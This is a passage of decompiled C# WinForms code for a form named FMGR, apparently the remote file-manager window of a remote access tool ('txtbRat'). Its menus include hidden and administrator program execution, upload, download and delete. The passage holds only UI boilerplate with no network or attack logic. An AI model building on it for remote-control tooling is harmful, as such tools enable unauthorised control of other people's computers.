using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.IconLib;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class FMGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("EtherealTabControl1")]
	private EtherealTabControl _EtherealTabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("TabPage3")]
	private TabPage _TabPage3;

	[AccessedThroughProperty("TabPage4")]
	private TabPage _TabPage4;

	[AccessedThroughProperty("TabPage6")]
	private TabPage _TabPage6;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("listFiles")]
	private ListView _listFiles;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("quikacc")]
	private TreeView _quikacc;

	[AccessedThroughProperty("ImageList2")]
	private ImageList _ImageList2;

	[AccessedThroughProperty("ContextMenuStrip1")]
	private ContextMenuStrip _ContextMenuStrip1;

	[AccessedThroughProperty("RunToolStripMenuItem")]
	private ToolStripMenuItem _RunToolStripMenuItem;

	[AccessedThroughProperty("ViewToolStripMenuItem")]
	private ToolStripMenuItem _ViewToolStripMenuItem;

	[AccessedThroughProperty("BackToolStripMenuItem")]
	private ToolStripMenuItem _BackToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	[AccessedThroughProperty("DownloadViaUrlToolStripMenuItem")]
	private ToolStripMenuItem _DownloadViaUrlToolStripMenuItem;

	[AccessedThroughProperty("ThumbnailsToolStripMenuItem")]
	private ToolStripMenuItem _ThumbnailsToolStripMenuItem;

	[AccessedThroughProperty("DownloadToolStripMenuItem")]
	private ToolStripMenuItem _DownloadToolStripMenuItem;

	[AccessedThroughProperty("UploadToolStripMenuItem")]
	private ToolStripMenuItem _UploadToolStripMenuItem;

	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[AccessedThroughProperty("ToolStripStatusLabel3")]
	private ToolStripStatusLabel _ToolStripStatusLabel3;

	[AccessedThroughProperty("ToolStripStatusLabel4")]
	private ToolStripStatusLabel _ToolStripStatusLabel4;

	[AccessedThroughProperty("StartSearc")]
	private Button _StartSearc;

	[AccessedThroughProperty("SearcFileName")]
	private TextBox _SearcFileName;

	[AccessedThroughProperty("SearchPath")]
	private TextBox _SearchPath;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("StatusStrip2")]
	private StatusStrip _StatusStrip2;

	[AccessedThroughProperty("ToolStripStatusLabel5")]
	private ToolStripStatusLabel _ToolStripStatusLabel5;

	[AccessedThroughProperty("listThumb")]
	private ListView _listThumb;

	[AccessedThroughProperty("StatusStrip3")]
	private StatusStrip _StatusStrip3;

	[AccessedThroughProperty("ToolStripStatusLabel6")]
	private ToolStripStatusLabel _ToolStripStatusLabel6;

	[AccessedThroughProperty("listDownloads")]
	private ListView _listDownloads;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader _ColumnHeader3;

	[AccessedThroughProperty("ColumnHeader4")]
	private ColumnHeader _ColumnHeader4;

	[AccessedThroughProperty("ColumnHeader5")]
	private ColumnHeader _ColumnHeader5;

	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	[AccessedThroughProperty("redSave")]
	private Button _redSave;

	[AccessedThroughProperty("reTextPath")]
	private TextBox _reTextPath;

	[AccessedThroughProperty("readGo")]
	private Button _readGo;

	[AccessedThroughProperty("StatusStrip4")]
	private StatusStrip _StatusStrip4;

	[AccessedThroughProperty("ToolStripStatusLabel7")]
	private ToolStripStatusLabel _ToolStripStatusLabel7;

	[AccessedThroughProperty("ContextMenuStrip2")]
	private ContextMenuStrip _ContextMenuStrip2;

	[AccessedThroughProperty("StopToolStripMenuItem")]
	private ToolStripMenuItem _StopToolStripMenuItem;

	[AccessedThroughProperty("SuspendToolStripMenuItem")]
	private ToolStripMenuItem _SuspendToolStripMenuItem;

	[AccessedThroughProperty("ContinueToolStripMenuItem")]
	private ToolStripMenuItem _ContinueToolStripMenuItem;

	[AccessedThroughProperty("RemoveAllCompletedToolStripMenuItem")]
	private ToolStripMenuItem _RemoveAllCompletedToolStripMenuItem;

	[AccessedThroughProperty("OpenDownloadFolderToolStripMenuItem")]
	private ToolStripMenuItem _OpenDownloadFolderToolStripMenuItem;

	[AccessedThroughProperty("Panel5")]
	private Panel _Panel5;

	[AccessedThroughProperty("NormalToolStripMenuItem")]
	private ToolStripMenuItem _NormalToolStripMenuItem;

	[AccessedThroughProperty("HiddenToolStripMenuItem")]
	private ToolStripMenuItem _HiddenToolStripMenuItem;

	[AccessedThroughProperty("AsAdministratorToolStripMenuItem")]
	private ToolStripMenuItem _AsAdministratorToolStripMenuItem;

	[AccessedThroughProperty("DetailsToolStripMenuItem")]
	private ToolStripMenuItem _DetailsToolStripMenuItem;

	[AccessedThroughProperty("LargeToolStripMenuItem")]
	private ToolStripMenuItem _LargeToolStripMenuItem;

	[AccessedThroughProperty("TitleToolStripMenuItem")]
	private ToolStripMenuItem _TitleToolStripMenuItem;

	[AccessedThroughProperty("TToolStripMenuItem")]
	private ToolStripMenuItem _TToolStripMenuItem;

	[AccessedThroughProperty("ContextMenuStrip3")]
	private ContextMenuStrip _ContextMenuStrip3;

	[AccessedThroughProperty("ExecuteToolStripMenuItem")]
	private ToolStripMenuItem _ExecuteToolStripMenuItem;

	[AccessedThroughProperty("DownloadToolStripMenuItem1")]
	private ToolStripMenuItem _DownloadToolStripMenuItem1;

	[AccessedThroughProperty("ImageList3")]
	private ImageList _ImageList3;

	[AccessedThroughProperty("ColumnHeader6")]
	private ColumnHeader _ColumnHeader6;

	[AccessedThroughProperty("ColumnHeader7")]
	private ColumnHeader _ColumnHeader7;

	[AccessedThroughProperty("ColumnHeader8")]
	private ColumnHeader _ColumnHeader8;

	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader _ColumnHeader9;

	[AccessedThroughProperty("ColumnHeader10")]
	private ColumnHeader _ColumnHeader10;

	[AccessedThroughProperty("ColumnHeader11")]
	private ColumnHeader _ColumnHeader11;

	[AccessedThroughProperty("ImageList4")]
	private ImageList _ImageList4;

	[AccessedThroughProperty("ToolStripStatusLabel8")]
	private ToolStripStatusLabel _ToolStripStatusLabel8;

	[AccessedThroughProperty("Panel6")]
	private Panel _Panel6;

	[AccessedThroughProperty("StopSearc")]
	private Button _StopSearc;

	[AccessedThroughProperty("Panel7")]
	private Panel _Panel7;

	[AccessedThroughProperty("listSearchFiles")]
	private ListView _listSearchFiles;

	[AccessedThroughProperty("ColumnHeader12")]
	private ColumnHeader _ColumnHeader12;

	[AccessedThroughProperty("ColumnHeader13")]
	private ColumnHeader _ColumnHeader13;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("CopyFilePathToolStripMenuItem")]
	private ToolStripMenuItem _CopyFilePathToolStripMenuItem;

	[AccessedThroughProperty("pathRefr")]
	private Button _pathRefr;

	[AccessedThroughProperty("LocatPath")]
	private TextBox _LocatPath;

	[AccessedThroughProperty("pathEntr")]
	private Button _pathEntr;

	[AccessedThroughProperty("DiscoverRarFileToolStripMenuItem")]
	private ToolStripMenuItem _DiscoverRarFileToolStripMenuItem;

	[AccessedThroughProperty("ViewPhotoToolStripMenuItem")]
	private ToolStripMenuItem _ViewPhotoToolStripMenuItem;

	[AccessedThroughProperty("ReadTextFileToolStripMenuItem")]
	private ToolStripMenuItem _ReadTextFileToolStripMenuItem;

	[AccessedThroughProperty("txtbRat")]
	private TextBox _txtbRat;

	[AccessedThroughProperty("PropertiesToolStripMenuItem")]
	private ToolStripMenuItem _PropertiesToolStripMenuItem;

	private ColumnHeader m_SortingColumn;

	public bool OPD;

	public object OSPath;

	public string Path;

	public object R;

	public int sock;

	internal virtual EtherealTabControl EtherealTabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _EtherealTabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_EtherealTabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage3 = value;
		}
	}

	internal virtual TabPage TabPage4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage4 = value;
		}
	}

	internal virtual TabPage TabPage6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage6 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual ListView listFiles
	{
		[DebuggerNonUserCode]
		get
		{
			return _listFiles;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			EventHandler eventHandler = Files_DoubleClick;
			ColumnClickEventHandler val = new ColumnClickEventHandler(Files_ColumnClick);
			if (_listFiles != null)
			{
				((Control)_listFiles).remove_DoubleClick(eventHandler);
				_listFiles.remove_ColumnClick(val);
			}
			_listFiles = value;
			if (_listFiles != null)
			{
				((Control)_listFiles).add_DoubleClick(eventHandler);
				_listFiles.add_ColumnClick(val);
			}
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual TreeView quikacc
	{
		[DebuggerNonUserCode]
		get
		{
			return _quikacc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected O, but got Unknown
			TreeNodeMouseHoverEventHandler val = new TreeNodeMouseHoverEventHandler(Fxtrv1_NodeMouseHover);
			EventHandler eventHandler = Fxtrv1_DoubleClick;
			TreeViewEventHandler val2 = new TreeViewEventHandler(quikacc_AfterSelect);
			if (_quikacc != null)
			{
				_quikacc.remove_NodeMouseHover(val);
				((Control)_quikacc).remove_DoubleClick(eventHandler);
				_quikacc.remove_AfterSelect(val2);
			}
			_quikacc = value;
			if (_quikacc != null)
			{
				_quikacc.add_NodeMouseHover(val);
				((Control)_quikacc).add_DoubleClick(eventHandler);
				_quikacc.add_AfterSelect(val2);
			}
		}
	}

	internal virtual ImageList ImageList2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList2 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem RunToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RunToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RunToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem ViewToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ViewToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ViewToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem BackToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _BackToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = BackToolStripMenuItem_Click;
			if (_BackToolStripMenuItem != null)
			{
				((ToolStripItem)_BackToolStripMenuItem).remove_Click(eventHandler);
			}
			_BackToolStripMenuItem = value;
			if (_BackToolStripMenuItem != null)
			{
				((ToolStripItem)_BackToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem_Click;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem = value;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RenameToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RenameToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RenameToolStripMenuItem_Click;
			if (_RenameToolStripMenuItem != null)
			{
				((ToolStripItem)_RenameToolStripMenuItem).remove_Click(eventHandler);
			}
			_RenameToolStripMenuItem = value;
			if (_RenameToolStripMenuItem != null)
			{
				((ToolStripItem)_RenameToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DeleteToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DeleteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DeleteToolStripMenuItem_Click;
			if (_DeleteToolStripMenuItem != null)
			{
				((ToolStripItem)_DeleteToolStripMenuItem).remove_Click(eventHandler);
			}
			_DeleteToolStripMenuItem = value;
			if (_DeleteToolStripMenuItem != null)
			{
				((ToolStripItem)_DeleteToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DownloadViaUrlToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DownloadViaUrlToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DownloadViaUrlToolStripMenuItem_Click;
			if (_DownloadViaUrlToolStripMenuItem != null)
			{
				((ToolStripItem)_DownloadViaUrlToolStripMenuItem).remove_Click(eventHandler);
			}
			_DownloadViaUrlToolStripMenuItem = value;
			if (_DownloadViaUrlToolStripMenuItem != null)
			{
				((ToolStripItem)_DownloadViaUrlToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ThumbnailsToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ThumbnailsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ThumbnailsToolStripMenuItem_Click;
			if (_ThumbnailsToolStripMenuItem != null)
			{
				((ToolStripItem)_ThumbnailsToolStripMenuItem).remove_Click(eventHandler);
			}
			_ThumbnailsToolStripMenuItem = value;
			if (_ThumbnailsToolStripMenuItem != null)
			{
				((ToolStripItem)_ThumbnailsToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DownloadToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DownloadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DownloadToolStripMenuItem_Click;
			if (_DownloadToolStripMenuItem != null)
			{
				((ToolStripItem)_DownloadToolStripMenuItem).remove_Click(eventHandler);
			}
			_DownloadToolStripMenuItem = value;
			if (_DownloadToolStripMenuItem != null)
			{
				((ToolStripItem)_DownloadToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem UploadToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UploadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = UploadToolStripMenuItem_Click;
			if (_UploadToolStripMenuItem != null)
			{
				((ToolStripItem)_UploadToolStripMenuItem).remove_Click(eventHandler);
			}
			_UploadToolStripMenuItem = value;
			if (_UploadToolStripMenuItem != null)
			{
				((ToolStripItem)_UploadToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel2 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel3 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel4 = value;
		}
	}

	internal virtual Button StartSearc
	{
		[DebuggerNonUserCode]
		get
		{
			return _StartSearc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StartS_Click;
			if (_StartSearc != null)
			{
				((Control)_StartSearc).remove_Click(eventHandler);
			}
			_StartSearc = value;
			if (_StartSearc != null)
			{
				((Control)_StartSearc).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox SearcFileName
	{
		[DebuggerNonUserCode]
		get
		{
			return _SearcFileName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SearcFileName = value;
		}
	}

	internal virtual TextBox SearchPath
	{
		[DebuggerNonUserCode]
		get
		{
			return _SearchPath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SearchPath = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual StatusStrip StatusStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip2 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel5 = value;
		}
	}

	internal virtual ListView listThumb
	{
		[DebuggerNonUserCode]
		get
		{
			return _listThumb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Lim1_DoubleClick;
			if (_listThumb != null)
			{
				((Control)_listThumb).remove_DoubleClick(eventHandler);
			}
			_listThumb = value;
			if (_listThumb != null)
			{
				((Control)_listThumb).add_DoubleClick(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip3 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel6 = value;
		}
	}

	internal virtual ListView listDownloads
	{
		[DebuggerNonUserCode]
		get
		{
			return _listDownloads;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(Downloads_MouseClick);
			if (_listDownloads != null)
			{
				((Control)_listDownloads).remove_MouseClick(val);
			}
			_listDownloads = value;
			if (_listDownloads != null)
			{
				((Control)_listDownloads).add_MouseClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader3 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader5 = value;
		}
	}

	internal virtual Panel Panel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel4 = value;
		}
	}

	internal virtual Button redSave
	{
		[DebuggerNonUserCode]
		get
		{
			return _redSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Save_Click;
			if (_redSave != null)
			{
				((Control)_redSave).remove_Click(eventHandler);
			}
			_redSave = value;
			if (_redSave != null)
			{
				((Control)_redSave).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox reTextPath
	{
		[DebuggerNonUserCode]
		get
		{
			return _reTextPath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_reTextPath = value;
		}
	}

	internal virtual Button readGo
	{
		[DebuggerNonUserCode]
		get
		{
			return _readGo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Go_Click;
			if (_readGo != null)
			{
				((Control)_readGo).remove_Click(eventHandler);
			}
			_readGo = value;
			if (_readGo != null)
			{
				((Control)_readGo).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip4
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip4 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel7 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip2 = value;
		}
	}

	internal virtual ToolStripMenuItem StopToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _StopToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StopToolStripMenuItem_Click;
			if (_StopToolStripMenuItem != null)
			{
				((ToolStripItem)_StopToolStripMenuItem).remove_Click(eventHandler);
			}
			_StopToolStripMenuItem = value;
			if (_StopToolStripMenuItem != null)
			{
				((ToolStripItem)_StopToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem SuspendToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _SuspendToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SuspendToolStripMenuItem_Click;
			if (_SuspendToolStripMenuItem != null)
			{
				((ToolStripItem)_SuspendToolStripMenuItem).remove_Click(eventHandler);
			}
			_SuspendToolStripMenuItem = value;
			if (_SuspendToolStripMenuItem != null)
			{
				((ToolStripItem)_SuspendToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ContinueToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContinueToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ContinueToolStripMenuItem_Click;
			if (_ContinueToolStripMenuItem != null)
			{
				((ToolStripItem)_ContinueToolStripMenuItem).remove_Click(eventHandler);
			}
			_ContinueToolStripMenuItem = value;
			if (_ContinueToolStripMenuItem != null)
			{
				((ToolStripItem)_ContinueToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RemoveAllCompletedToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoveAllCompletedToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoveAllCompletedToolStripMenuItem_Click;
			if (_RemoveAllCompletedToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveAllCompletedToolStripMenuItem).remove_Click(eventHandler);
			}
			_RemoveAllCompletedToolStripMenuItem = value;
			if (_RemoveAllCompletedToolStripMenuItem != null)
			{
